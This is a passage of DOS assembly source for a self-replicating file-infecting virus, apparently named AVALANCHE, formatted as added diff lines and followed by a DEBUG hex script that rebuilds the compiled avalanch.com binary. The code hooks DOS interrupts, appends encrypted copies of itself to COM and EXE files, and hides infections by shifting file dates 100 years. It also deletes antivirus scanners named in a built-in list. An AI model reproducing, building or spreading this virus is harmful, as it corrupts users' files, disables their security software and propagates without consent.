+          xor   cx,cx               ; pointer to end of file
+	  xor	dx,dx
+	  pushf
+	  call cs:[int21alt]
+	  jae	exe6
+          jmp   short fehler        ; exit on error
+
+exe6:     mov   [org_filelng_lo],ax      ; store lo-word o file length
+          mov   [org_filelng_hi],dx      ; hi-word also
+
+exe8:   cmp   word ptr cs:[psp],5a4dh ; is it an exe file or a .com ?
+        jne   exe9
+exe80:  call  infektexe           ; infect .exe
+        jmp   short fehler        ; exit on error
+
+exe9:   cmp   [org_filelng_lo],62000  ; .com > 62000  ? -> exit
+        ja    fehler
+
+        call  infektcom           ; infect com file
+
+;---------------------------------------------------------------
+
+fehler:   call reset_status        ; reset file attributes
+          mov   ah,3eh             ; close file
+          pushf
+	  call	cs:[OrgDos]
+
+exeaus:   call reset_attrib
+
+exeaus2:  call encrit              ; enable error handler
+
+exeaus3:  cmp  cs:[internal],1     ; internal use ?
+	  je   rtocaller
+	  call popall
+
+          jmp  cs:[int21alt]         ; execute program
+
+rtocaller: mov cs:[internal],0
+	   call popall
+           ret                     ; back to caller (virus)
+
+exec	  ENDP
+
+;---------------------------------------------------------------------------
+
+reset_status PROC NEAR  ; reset original file and date stamps
+
+; [Flag]=1 == > increase date by 100 years
+; file has to be openend
+
+          mov   ax,5701h            ; restore date/time
+	  mov	bx,[handle]
+	  mov	cx,[d_zeit]
+	  mov	dx,[d_datum]
+          cmp   [flag],1            ; has infection took place ?
+	  jne	fe1
+          add   dx,1100100000000000b ; add 100 years
+fe1:	  pushf
+	  call cs:[OrgDos]
+	  ret
+
+reset_status ENDP
+
+;---------------------------------------------------------------------------
+reset_attrib PROC NEAR          ; restore original file attibutes
+
+	  mov	cx,[d_attrib]
+	  mov	ax,4301h
+	  mov	dx,[nam_off]
+          mov   bx,[nam_seg]   ; DS:DX pointer to filename
+	  push	bx
+	  pop	ds
+	  pushf
+	  call	cs:[OrgDos]
+	  ret
+
+reset_attrib ENDP
+
+;---------------------------------------------------------------------------
+
+infektcom  proc near                ; infect com file
+
+	   IF COMPERMIS
+
+           mov ax, word ptr cs:[psp+2] ; is it a device driver ?
+	   cmp ah,0ffh
+           je infektende               ; exit if so.
+	   cmp al,0ffh
+	   je infektende
+
+           ;--- calc new entry ----------------------------
+
+           mov  bx,[org_filelng_lo]
+	   sub	bx,3h
+	   mov	word ptr [com_vek+1],bx
+
+           ;--- write new entry -------------------------
+
+           mov  ax,4200h            ; set file pointer to first byte
+	   mov	bx,cs:[handle]
+	   xor	dx,dx
+	   xor	cx,cx
+
+	   pushf
+	   call cs:[OrgDos]
+	   jc	 infektende
+
+           mov   ah,40h             ; write new entry
+           mov   cx,3               ; 3 bytes
+	   mov	 dx,offset com_vek
+	   pushf
+	   call cs:[OrgDos]
+	   jc	 infektende
+
+           mov   ax,4202h           ; set pointer to end of file
+           xor   dx,dx
+	   xor	 cx,cx
+
+	   pushf
+	   call cs:[OrgDos]
+	   jc	 infektende
+
+           mov   [ip_merk],100h     ; store IP
+           mov   [comflag],1        ; flag indicates COM file
+
+           mov   ax,word ptr cs:[psp] ; store original bytes
+	   mov	 word ptr [combytes],ax
+	   mov	 al,byte ptr cs:[psp+2]
+	   mov	 byte ptr [combytes+2],al
+
+           mov   [min_mem],4096     ; minimum amount of memory for a com file
+
+	   mov	 ax,[org_filelng_lo]
+	   add	 ax,offset vircode
+	   mov	 word ptr [kenn1+1],ax
+
+	   call kodier
+           mov  [flag],1            ; file was successfully infected
+
+	   ENDIF
+
+infektende: ret
+
+infektcom     endp
+
+;----------------------------------------------------------------------------
+
+infektexe  proc near                 ; infect exe file  (uff, very difficult)
+
+	   IF EXEPERMIS
+
+	   push cs
+	   pop	es
+
+	   mov	 si,offset psp
+
+
+kompr:     cmp  word ptr [si+segtab],1  ; is it a compressed or selfchecking
+           ja   checkwin                ; file ?
+           ret                          ; exit if so.
+
+checkwin:  cmp byte ptr [si+18h],40h    ; is it a new exe header ?
+           jne checkovl                 ; forget it!
+	   ret
+
+checkovl:  cmp byte ptr [si+ovl_no],0   ; no overlays please !
+	   je checklng
+	   ret
+
+checklng:  mov   dx,[org_filelng_hi]    ; check for internal overlays
+           mov   ax,[org_filelng_lo]
+	   call  divide
+           inc   ax                     ; add 512 bytes
+
+           cmp   ax,[si+div512]         ; compare only hi-byte
+	   je	 go
+	   ret
+
+go:        mov   ax,word ptr [si+cs_pos] ; store CS
+	   mov	 [cs_merk],ax
+           mov   ax,word ptr [si+ss_pos] ; store SS
+	   mov	 [ss_merk],ax
+           mov   ax,word ptr [si+sp_pos] ; store SP
+	   mov	 [sp_merk],ax
+           mov   ax,word ptr [si+ip_pos] ; and IP
+	   mov	 [ip_merk],ax
+
+           mov   dx,[org_filelng_hi]     ; filesize  to   DX:AX
+           mov   ax,[org_filelng_lo]     ; calc new CS and SS
+
+           mov   bx,[si+hdl_pos]        ; calc header size in bytes
+	   mov	 cl,4
+	   shl	 bx,cl
+
+           sub   ax,bx                  ; subtract header size from filesize
+           sbb   dx,0                   ; -> DX:AX
+
+           mov   bx,ax                  ; calc new IP
+           and   bx,0000000000001111b  ; Lo-nibble is offset of IP
+	   mov	 [si+ip_pos],bx
+
+           mov   cx,4                  ; filesize -> pararaphs
+divide0:   sar	 dx,1
+	   rcr	 ax,1
+           loop  divide0               ; result in AX
+
+           mov   [si+ss_pos],ax        ; set new SS
+           mov   [si+cs_pos],ax        ; SS=CS
+
+           mov  [min_mem],ax           ; set up amount of memory for virus
+
+           mov   word ptr [si+sp_pos],((virende-start)+100h) ; set SP
+
+ramok:     mov  ax,[org_filelng_lo]   ; fix filesize int header
+	   mov	dx,[org_filelng_hi]
+           add  ax,(virende-start+512)  ; add virus + 512
+	   adc	dx,0
+
+	   call divide
+	   mov	word ptr [si+mod512],bx
+	   mov	word ptr [si+div512],ax
+
+           xor  cx,cx                   ; set file pointer to header
+	   mov	dx,0
+	   mov	bx,[handle]
+	   mov	ax,4200h
+	   int	DOS_N
+	   jc	exeinfende
+
+           mov  ah,40h                 ; write new values in header
+           mov  cx,1ch
+	   mov	dx,offset psp
+	   pushf
+	   call cs:[int21alt]
+	   jc	exeinfende
+
+           mov   ax,4202h            ; file pointer to end of file
+           xor   dx,dx
+	   xor	 cx,cx
+	   int	 DOS_N
+	   jc	 exeinfende
+
+           mov   [comflag],0         ; host is an exe file
+
+	   mov	 ax,[si+ip_pos]
+	   add	 ax,(offset vircode -100h)
+           mov   word ptr [kenn1+1],ax ; set up new delta offset
+
+           call  kodier              ; encrypt virus and write it to host
+
+           mov   [flag],1            ; infection successful
+
+	   ENDIF
+
+exeinfende: ret
+
+infektexe   endp
+
+;---------------------------------------------------------------------------
+; disable critical error handler to avoid write errors on write-protected
+; disks
+
+discrit proc near
+
+	call	pushall
+	push	cs
+	pop	ds
+
+        mov     ax,3524h            ; get old INT 24h
+        int     DOS_N               ;
+	mov	word ptr [crbreak],bx
+	mov	word ptr [crbreak+2],es
+
+        mov     ax,2524h            ; set new handler
+        mov     dx,offset cint
+	pushf
+        call    cs:[OrgDos]
+
+	call	popall
+	ret
+
+discrit endp
+
+;---------------------------------------------------------------------------
+; enable critical error handler
+
+encrit proc near
+
+	call	pushall
+
+        mov     dx,word ptr cs:[crbreak] ; restore old INT 24h
+	mov	ax,word ptr [crbreak+2]
+	mov	ds,ax
+	mov	ax,2524h
+	int	DOS_N
+	call	popall
+	ret
+
+encrit endp
+
+;---------------------------------------------------------------------------
+
+; INPUT   DX:AX value to divide by 512
+; OUTPUT  AX    value DIV 512
+;         BX    value MOD 512
+
+divide	  proc near
+
+	   mov	bx,ax
+           and  bx,0000000111111111b    ; filesize   MOD 512
+
+           mov  cx,9                    ; 32 bit division
+divide1:   clc
+	   shr	dx,1
+	   rcr	ax,1
+	   loop divide1
+
+	   ret
+
+divide	   endp
+
+;*****************************************************************************
+; encyrpt virus and stick it to the end of host                              *
+;*****************************************************************************
+
+kodier     proc near
+
+	   push cs
+	   pop	es
+           inc  [generation]            ; increase generation counter
+	   cld
+           mov   dx,offset (virende-start)  ; virussize
+           mov   si,offset start            ; start of virus
+	   mov	 ah,byte ptr [org_filelng_lo]
+	   xor	 ah,0aah
+           mov   byte ptr [entschl+3],ah     ; decryptor value
+
+kod0:      mov   ah,byte ptr [org_filelng_lo]    ; key in in ah
+	   xor	 ah,0aah
+           mov   di,psp              ; set pointer to unused psp
+           xor   cx,cx              ; reset byte counter
+
+kod1:      lodsb                    ; load a word
+           cmp   si,offset vircode  ; encyrpt it  ?
+           jna   ncode              ; no, it's the virus decryptor
+           cmp   si,offset vor_header ; do not encrypt the original header
+	   ja	 ncode
+           xor   al,ah              ; encrypt word
+ncode:     stosb                    ; and write it to psp
+	   inc	cx
+           cmp  cx,250              ; is buffer full  ?
+           jna  kod2                ; yes, then write it to disk
+	   jmp	short kodaus
+kod2:      cmp  cx,dx               ; are we ready ?
+           jne  kod1                ; no, continue
+
+kodaus:    sub  dx,cx
+
+           push dx                  ; write encrypted by to host
+	   mov	bx,[handle]
+           mov  dx,psp              ; ds:dx pointer to start of encry.buffer
+	   mov	ah,40h
+           pushf                    ; write cx bytes
+	   call cs:[int21alt]
+	   pop	dx
+           jc   kodrueck            ; exit on error
+	   or	dx,dx
+	   je	kodrueck
+	   jmp	short kod0
+
+	   dec	[generation]
+	   cmp	[generation],32
+	   jne	kodrueck
+absturz:   jmp  absturz
+
+kodrueck:  ret
+
+kodier	   endp
+
+;***************************************************************************
+;*** check if file is infected                                          ****
+;*** INPUT  : BX=Handle                                                 ****
+;*** OUTPUT : C=0: file is clean / C=1: file is infected or access denied***
+;***************************************************************************
+
+pruefinf   proc near
+
+	   push  bx
+	   push  ax
+	   push  cx
+	   push  dx
+
+           mov   ax,5700h             ; get time/date stamps
+	   pushf
+	   call cs:[int21alt]
+	   mov	 cs:[d_datum],dx
+	   mov	 cs:[d_zeit],cx
+
+           and   dx,1111111000000000b ; mask out the month
+           mov   cl,9                 ; year to low byte
+	   shr	 dx,cl
+           cmp   dx,90                ; year <90  file id clean
+	   jb	 nichtinf
+
+           stc                        ; set infection flag
+pruefaus:  pop	 dx
+	   pop	 cx
+	   pop	 ax
+	   pop	 bx
+	   ret
+
+nichtinf:  clc
+	   jmp	 short pruefaus
+
+pruefinf    endp
+
+;*************************************************************************
+; retro function: delete scanners
+;*************************************************************************
+
+scanner db "F-PR",0
+	db "TBAV",0
+	db "SCAN",0
+	db "MSAV",0
+	db "CPAV",0
+	db "TBME",0
+	db "TBFI",0
+	db "TBSC",0
+	db "VIRS",0
+	db "TBDR",0
+        db 0
+
+fuck_scanner PROC NEAR
+
+	IF RETRO
+
+	call	pushall
+
+        push    cs                        ; ES=CS
+	pop	es
+
+        mov     ax,cs:[nam_seg]           ; get filename
+        mov     ds,ax                     ; to  DS:SI
+	mov	si,cs:[nam_off]
+
+fd_end: inc	si
+        cmp     byte ptr ds:[si],0        ; find last char
+	jne	fd_end
+
+fc2:    dec     si                         ; set pointer to filename
+	cmp	byte ptr ds:[si-1],"\"
+	jne	fc2
+
+	mov	cx,4
+	mov	di,offset scanner
+        call    search                     ; search for scanner
+	jae	fuckend
+
+gotcha: mov	dx,si
+        mov     ah,41h                     ; delete scanner
+	pushf
+	call	cs:[OrgDos]
+
+fuckend: call	popall
+
+       ENDIF
+       ret
+
+fuck_scanner ENDP
+
+;**************************************************************************
+; compare a string with a list of strings
+; INPUT: DS:SI string to find
+;        es:di list
+;        cx    number of bytes to compare
+; OUPUT: C=1 if string was found
+;        DX  position of string
+;**************************************************************************
+
+search PROC NEAR
+
+        mov  ax,cx                     ; store cx
+	xor  dx,dx
+        cld
+comp:	mov  cx,ax
+        push si                        ; store SI (pointer to reference)
+        repe cmpsb                     ; compare strings
+	pop  si
+        jz   treffer                   ; Z=1 -> string found
+
+s_str:  cmp  byte ptr es:[di],0        ; find start of next string in list
+	je   str_gef
+	inc  di
+	jmp  short s_str
+str_gef: inc  di
+        cmp  byte ptr es:[di],0         ; end of list ?
+	je   failed
+	inc  dx
+	jmp  short comp
+treffer: stc
+	ret
+
+failed:  clc
+	 ret
+
+search ENDP
+
+;---------------------------------------------------------------------------
+
+pushall proc near
+
+        pop  cs:[ret_off]
+	pushf
+	push ax
+	push bx
+	push cx
+	push dx
+	push bp
+	push si
+	push di
+	push es
+	push ds
+        push cs:[ret_off]
+	ret
+
+pushall endp
+
+;----------------------------------------------------------------------------
+
+popall	proc near
+
+	pop  cs:[ret_off]
+	pop  ds
+	pop  es
+	pop  di
+	pop  si
+	pop  bp
+	pop  dx
+	pop  cx
+	pop  bx
+	pop  ax
+	popf
+	push cs:[ret_off]
+	ret
+
+popall	endp
+
+vor_header equ this byte
+orig_exehead    db 1ch dup (?)   ; position of original exe header
+
+
+virende   equ this byte
+
+code ends
+	 end start
+-----------------------------------
+N avalanch.com
+E 0100  66 B9 F0 0A 00 00 BB 1D 02 EB 06 EA 2E 80 37 00
+E 0110  43 E2 F9 E8 00 00 58 8B E8 81 ED 16 01 EB 01 81
+E 0120  EB 58 20 41 56 41 4C 41 4E 43 48 45 2F 47 65 72
+E 0130  6D 61 6E 79 20 27 39 34 2E 2E 2E 4D 65 74 61 6C
+E 0140  20 4A 75 6E 6B 69 65 20 67 72 65 65 74 73 20 4E
+E 0150  65 75 72 6F 62 61 73 68 65 72 00 00 00 00 00 00
+E 0160  FE FF 00 00 00 10 00 01 00 00 C3 00 01 E9 00 00
+E 0170  00 00 00 00 00 00 00 01 00 00 FA 8C 9E 5C 01 FC
+E 0180  0E 1F B8 F0 4B 33 FF CD 21 81 FF 68 73 75 03 E9
+E 0190  50 01 B4 30 CD 21 3C 05 73 03 E9 45 01 B4 04 CD
+E 01A0  1A 72 0E 81 F9 96 19 73 08 80 FE 01 73 03 E9 31
+E 01B0  01 E8 46 01 B4 0E B2 AD CD 21 3C BA 75 4A E9 21
+E 01C0  01 8B 86 5C 01 8E D8 8E C0 80 BE 77 01 01 74 1F
+E 01D0  8C C0 03 86 5A 01 05 10 00 89 86 68 01 8B A6 60
+E 01E0  01 8C C0 2E 03 86 62 01 05 10 00 8E D0 EB 07 8C
+E 01F0  C8 2E 89 86 68 01 33 C0 8B D8 8B C8 8B D0 8B F0
+E 0200  8B F8 FB 2E FF AE 66 01 8B 86 5C 01 8E C0 8B 9E
+E 0210  64 01 B4 4A CD 21 73 03 E9 C7 00 0E 07 C6 86 26
+E 0220  04 00 C6 86 25 04 00 B8 00 58 CD 21 89 86 74 01
+E 0230  B8 02 58 CD 21 73 03 E9 A8 00 88 86 76 01 B8 01
+E 0240  58 BB 02 00 CD 21 B8 03 58 BB 00 00 CD 21 BB D7
+E 0250  00 B4 48 CD 21 72 65 50 48 8E C0 40 26 C7 06 00
+E 0260  00 5A 00 26 C7 06 01 00 08 00 B8 21 35 CD 21 89
+E 0270  9E 05 04 8C 86 07 04 89 9E 0D 04 8C 86 0F 04 E8
+E 0280  C3 00 3D FF 00 74 08 8C 86 0F 04 89 86 0D 04 B8
+E 0290  13 35 CD 21 89 9E 09 04 8C 86 0B 04 07 06 BE 00
+E 02A0  01 03 F5 BF 00 01 B9 02 0B F3 A4 BA 31 04 B8 21
+E 02B0  25 1F CD 21 BA BD 07 B8 13 25 CD 21 0E 1F FF B6
+E 02C0  5C 01 07 BB FF FF B4 4A CD 21 B4 4A CD 21 8A 9E
+E 02D0  76 01 32 FF B8 03 58 CD 21 8B 9E 74 01 B8 01 58
+E 02E0  CD 21 80 BE 77 01 01 75 0E 8B BE 66 01 BE 6A 01
+E 02F0  03 F5 B9 03 00 F3 A4 E9 C7 FE 06 50 53 51 52 56
+E 0300  57 B8 00 FA BA 45 59 CD 16 81 FF 59 45 75 17 B8
+E 0310  02 FA BA 45 59 B3 00 CD 16 80 E1 17 8A D9 B8 02
+E 0320  FA BA 45 59 CD 16 1E 33 C0 8E D8 C4 36 84 00 1F
+E 0330  26 8B 04 3D EB 05 75 05 26 C7 04 90 90 5F 5E 5A
+E 0340  59 5B 58 07 C3 B4 52 CD 21 72 75 26 8B 47 FE 89
+E 0350  86 CF 03 33 C0 8E C0 26 C4 06 04 00 89 86 C6 03
+E 0360  8C 86 C8 03 2E C6 86 CE 03 00 2E 89 AE D7 03 FA
+E 0370  33 C0 8E C0 BB D1 03 03 DD 26 89 1E 04 00 26 8C
+E 0380  0E 06 00 FB 9C 58 80 CC 01 50 9D B4 0B FA 9C 2E
+E 0390  FF 9E 05 04 9C 58 25 FF FE 50 9D FA 1E 33 C0 8E
+E 03A0  D8 2E C4 86 C6 03 A3 04 00 8C 06 06 00 1F FB 80
+E 03B0  BE CE 03 01 75 0B 8B 86 CC 03 8E C0 8B 86 CA 03
+E 03C0  C3 B8 FF 00 EB FA 00 00 00 00 00 00 00 00 00 00
+E 03D0  00 55 8B EC 50 56 BE 00 00 8B 46 04 2E 3B 84 CF
+E 03E0  03 76 04 5E 58 5D CF 2E 89 84 CC 03 8B 46 02 2E
+E 03F0  89 84 CA 03 2E C6 84 CE 03 01 81 66 06 FF FE EB
+E 0400  E2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+E 0410  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+E 0420  00 00 00 00 00 00 00 2A 2E 63 6F 6D 00 FB B0 03
+E 0430  CF 80 FC 4B 75 1E 3C F0 74 11 3C 05 74 11 3C 03
+E 0440  74 0D 2E C6 06 23 04 00 E9 77 03 BF 68 73 CF 2E
+E 0450  FF 2E 05 04 2E 80 3E 25 04 01 74 3A 2E 80 3E 26
+E 0460  04 01 74 32 80 FC 4E 75 02 EB 30 80 FC 4F 75 02
+E 0470  EB 29 80 FC 11 74 5F 80 FC 12 74 5A EB 00 3D 00
+E 0480  57 75 03 E9 A6 00 80 FC 42 75 03 E9 BF 00 80 FC
+E 0490  3F 75 03 E9 F4 00 2E FF 2E 05 04 9C 2E FF 1E 05
+E 04A0  04 72 02 EB 03 CA 02 00 E8 11 07 B4 2F CD 21 26
+E 04B0  8B 47 18 25 00 FE B1 09 D3 E8 3D 5A 00 76 11 26
+E 04C0  81 6F 1A 02 0B 26 83 5F 1C 00 26 81 6F 18 00 C8
+E 04D0  E8 FE 06 CA 02 00 9C 2E FF 1E 05 04 E8 DD 06 3C
+E 04E0  FF 75 02 EB 41 B4 2F CD 21 26 80 3F FF 74 08 BE
+E 04F0  19 00 BF 1D 00 EB 06 BE 20 00 BF 24 00 26 8B 00
+E 0500  25 00 FE B1 09 D3 E8 3D 5A 00 76 1A 26 81 29 02
+E 0510  0B 26 83 59 02 00 26 81 69 F9 02 0B 26 83 59 FB
+E 0520  00 26 81 28 00 C8 E8 A8 06 CA 02 00 9C 2E FF 1E
+E 0530  05 04 9C 50 51 8B C2 25 00 FE B1 09 D3 E8 3D 5A
+E 0540  00 76 04 81 EA 00 C8 59 58 9D CA 02 00 3C 02 75
+E 0550  18 0B CA 75 14 E8 AA 05 73 0F B9 FF FF BA FE F4
+E 0560  9C 2E FF 1E 05 04 CA 02 00 2E FF 2E 05 04 00 00
+E 0570  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+E 0580  00 00 00 00 00 00 00 00 00 00 83 FB 05 73 02 EB
+E 0590  40 E8 6E 05 73 3B 2E 8C 1E 80 05 0E 1F A3 82 05
+E 05A0  89 1E 6E 05 89 0E 70 05 89 16 86 05 8C 06 7E 05
+E 05B0  EB 44 2E 8B 0E 70 05 2E 8B 1E 6E 05 2E 8B 16 86
+E 05C0  05 2E A1 7E 05 8E C0 2E A1 80 05 8E D8 2E A1 82
+E 05D0  05 2E FF 2E 05 04 2E 8B 0E 70 05 2E 8B 16 86 05
+E 05E0  2E 8B 1E 7E 05 8E C3 2E 8B 1E 80 05 8E DB 2E 8B
+E 05F0  1E 6E 05 CA 02 00 B8 01 42 33 C9 33 D2 9C 2E FF
+E 0600  1E 05 04 72 AD A3 72 05 89 16 74 05 03 06 70 05
+E 0610  83 D2 00 A3 76 05 89 16 78 05 B8 02 42 33 C9 33
+E 0620  D2 9C 2E FF 1E 05 04 2D 02 0B 83 DA 00 A3 7A 05
+E 0630  89 16 7C 05 B8 00 42 8B 0E 74 05 8B 16 72 05 9C
+E 0640  2E FF 1E 05 04 73 03 E9 68 FF A1 72 05 3D 1D 00
+E 0650  72 11 8B 1E 74 05 C4 0E 7A 05 8C C2 E8 28 01 72
+E 0660  20 EB 35 C4 06 76 05 8C C3 33 D2 B9 1D 00 E8 16
+E 0670  01 72 2C C4 0E 7A 05 8C C2 E8 0B 01 72 5E E9 D5
+E 0680  00 C4 06 76 05 8C C3 C4 0E 7A 05 8C C2 E8 F7 00
+E 0690  72 03 E9 D0 00 E9 CA 00 B8 00 00 F8 E9 37 FF BA
+E 06A0  1C 00 2B 16 72 05 52 F7 DA B9 FF FF B0 02 E8 F8
+E 06B0  00 8B 16 86 05 8B 0E 70 05 8B 1E 6E 05 B4 3F FF
+E 06C0  36 80 05 1F 9C 2E FF 1E 05 04 0E 1F 8B 0E 78 05
+E 06D0  8B 16 76 05 B0 00 E8 D0 00 E9 FA FE 8B 0E 70 05
+E 06E0  8B 1E 6E 05 8B 16 86 05 FF 36 80 05 1F B4 3F 9C
+E 06F0  2E FF 1E 05 04 73 03 E9 DC FE 0E 1F A3 88 05 BA
+E 0700  1C 00 2B 16 72 05 52 F7 DA B9 FF FF B0 02 E8 98
+E 0710  00 73 03 59 EB 7E 59 FF 36 80 05 58 8B 16 86 05
+E 0720  03 16 72 05 15 00 00 8E D8 2E 8B 1E 6E 05 B4 3F
+E 0730  9C 2E FF 1E 05 04 73 02 EB 5A 0E 1F 8B 0E 74 05
+E 0740  8B 16 72 05 03 16 88 05 83 D1 00 32 C0 E8 59 00
+E 0750  A1 88 05 E9 80 FE A1 7A 05 2B 06 72 05 8B C8 E9
+E 0760  7E FF E9 4D FE 8B 0E 7A 05 2B 0E 72 05 51 8B 1E
+E 0770  6E 05 8B 16 86 05 B4 3F FF 36 80 05 1F 9C 2E FF
+E 0780  1E 05 04 59 E9 6C FE 3B DA 77 08 72 06 3B C1 77
+E 0790  02 72 00 C3 2E 8B 16 72 05 2E 8B 0E 74 05 32 C0
+E 07A0  E8 06 00 33 C0 F8 E9 2D FE 50 53 52 B4 42 2E 8B
+E 07B0  1E 6E 05 9C 2E FF 1E 05 04 5A 5B 58 C3 2E FF 2E
+E 07C0  09 04 E8 F7 03 2E C6 06 23 04 00 2E C6 06 26 04
+E 07D0  00 E8 26 FB EB 09 E8 E3 03 2E C6 06 23 04 01 2E
+E 07E0  89 16 11 04 2E 8C 1E 13 04 2E C6 06 24 04 00 1E
+E 07F0  52 E8 5B 02 5A 1F B8 00 43 CD 21 73 03 E9 B0 00
+E 0800  2E 89 0E 1D 04 F7 C1 04 00 74 03 E9 A2 00 B8 01
+E 0810  43 83 E1 FE 9C 2E FF 1E 05 04 73 03 E9 8E 00 E8
+E 0820  40 03 B8 00 3D 9C 2E FF 1E 05 04 73 02 EB 7E 8B
+E 0830  D8 0E 1F 89 1E 1F 04 53 B8 20 12 CD 2F 26 8A 05
+E 0840  8A D8 B8 16 12 CD 2F 5B 73 02 EB 56 26 C7 45 02
+E 0850  02 00 E8 AD 02 73 02 EB 49 BA 00 00 B9 1C 00 B4
+E 0860  3F CD 21 72 3D 8B F2 B9 1C 00 BF E6 0B 0E 07 F3
+E 0870  A4 B8 02 42 33 C9 33 D2 9C 2E FF 1E 05 04 73 02
+E 0880  EB 20 A3 70 01 89 16 72 01 2E 81 3E 00 00 4D 5A
+E 0890  75 05 E8 ED 00 EB 0B 81 3E 70 01 30 F2 77 03 E8
+E 08A0  64 00 E8 28 00 B4 3E 9C 2E FF 1E 0D 04 E8 3E 00
+E 08B0  E8 BE 01 2E 80 3E 23 04 01 74 08 E8 13 03 2E FF
+E 08C0  2E 05 04 2E C6 06 23 04 00 E8 05 03 C3 B8 01 57
+E 08D0  8B 1E 1F 04 8B 0E 1B 04 8B 16 19 04 80 3E 24 04
+E 08E0  01 75 04 81 C2 00 C8 9C 2E FF 1E 0D 04 C3 8B 0E
+E 08F0  1D 04 B8 01 43 8B 16 11 04 8B 1E 13 04 53 1F 9C
+E 0900  2E FF 1E 0D 04 C3 2E A1 02 00 80 FC FF 74 72 3C
+E 0910  FF 74 6E 8B 1E 70 01 83 EB 03 89 1E 6E 01 B8 00
+E 0920  42 2E 8B 1E 1F 04 33 D2 33 C9 9C 2E FF 1E 0D 04
+E 0930  72 4F B4 40 B9 03 00 BA 6D 01 9C 2E FF 1E 0D 04
+E 0940  72 3F B8 02 42 33 D2 33 C9 9C 2E FF 1E 0D 04 72
+E 0950  30 C7 06 66 01 00 01 C6 06 77 01 01 2E A1 00 00
+E 0960  A3 6A 01 2E A0 02 00 A2 6C 01 C7 06 64 01 00 10
+E 0970  A1 70 01 05 13 01 A3 07 01 E8 1C 01 C6 06 24 04
+E 0980  01 C3 0E 07 BE 00 00 83 7C 06 01 77 01 C3 80 7C
+E 0990  18 40 75 01 C3 80 7C 1A 00 74 01 C3 8B 16 72 01
+E 09A0  A1 70 01 E8 E1 00 40 3B 44 04 74 01 C3 8B 44 16
+E 09B0  A3 5A 01 8B 44 0E A3 62 01 8B 44 10 A3 60 01 8B
+E 09C0  44 14 A3 66 01 8B 16 72 01 A1 70 01 8B 5C 08 B1
+E 09D0  04 D3 E3 2B C3 83 DA 00 8B D8 83 E3 0F 89 5C 14
+E 09E0  B9 04 00 D1 FA D1 D8 E2 FA 89 44 0E 89 44 16 A3
+E 09F0  64 01 C7 44 10 02 0C A1 70 01 8B 16 72 01 05 02
+E 0A00  0D 83 D2 00 E8 80 00 89 5C 02 89 44 04 33 C9 BA
+E 0A10  00 00 8B 1E 1F 04 B8 00 42 CD 21 72 31 B4 40 B9
+E 0A20  1C 00 BA 00 00 9C 2E FF 1E 05 04 72 21 B8 02 42
+E 0A30  33 D2 33 C9 CD 21 72 16 C6 06 77 01 00 8B 44 14
+E 0A40  05 13 00 A3 07 01 E8 4F 00 C6 06 24 04 01 C3 E8
+E 0A50  6A 01 0E 1F B8 24 35 CD 21 89 1E 01 04 8C 06 03
+E 0A60  04 B8 24 25 BA 2D 04 9C 2E FF 1E 0D 04 E8 61 01
+E 0A70  C3 E8 48 01 2E 8B 16 01 04 A1 03 04 8E D8 B8 24
+E 0A80  25 CD 21 E8 4B 01 C3 8B D8 81 E3 FF 01 B9 09 00
+E 0A90  F8 D1 EA D1 D8 E2 F9 C3 0E 07 FF 06 78 01 FC BA
+E 0AA0  02 0B BE 00 01 8A 26 70 01 80 F4 AA 88 26 0F 01
+E 0AB0  8A 26 70 01 80 F4 AA BF 00 00 33 C9 AC 81 FE 13
+E 0AC0  01 76 08 81 FE E6 0B 77 02 32 C4 AA 41 81 F9 FA
+E 0AD0  00 76 02 EB 04 3B CA 75 E3 2B D1 52 8B 1E 1F 04
+E 0AE0  BA 00 00 B4 40 9C 2E FF 1E 05 04 5A 72 13 0B D2
+E 0AF0  74 0F EB BC FF 0E 78 01 83 3E 78 01 20 75 02 EB
+E 0B00  FE C3 53 50 51 52 B8 00 57 9C 2E FF 1E 05 04 2E
+E 0B10  89 16 19 04 2E 89 0E 1B 04 81 E2 00 FE B1 09 D3
+E 0B20  EA 83 FA 5A 72 06 F9 5A 59 58 5B C3 F8 EB F8 46
+E 0B30  2D 50 52 00 54 42 41 56 00 53 43 41 4E 00 4D 53
+E 0B40  41 56 00 43 50 41 56 00 54 42 4D 45 00 54 42 46
+E 0B50  49 00 54 42 53 43 00 56 49 52 53 00 54 42 44 52
+E 0B60  00 00 E8 57 00 0E 07 2E A1 13 04 8E D8 2E 8B 36
+E 0B70  11 04 46 80 3C 00 75 FA 4E 80 7C FF 5C 75 F9 B9
+E 0B80  04 00 BF 2F 0B E8 10 00 73 0A 8B D6 B4 41 9C 2E
+E 0B90  FF 1E 0D 04 E8 3A 00 C3 8B C1 33 D2 FC 8B C8 56
+E 0BA0  F3 A6 5E 74 13 26 80 3D 00 74 03 47 EB F7 47 26
+E 0BB0  80 3D 00 74 05 42 EB E5 F9 C3 F8 C3 2E 8F 06 21
+E 0BC0  04 9C 50 53 51 52 55 56 57 06 1E 2E FF 36 21 04
+E 0BD0  C3 2E 8F 06 21 04 1F 07 5F 5E 5D 5A 59 5B 58 9D
+E 0BE0  2E FF 36 21 04 C3
+R CX
+0AE6
+W
+Q
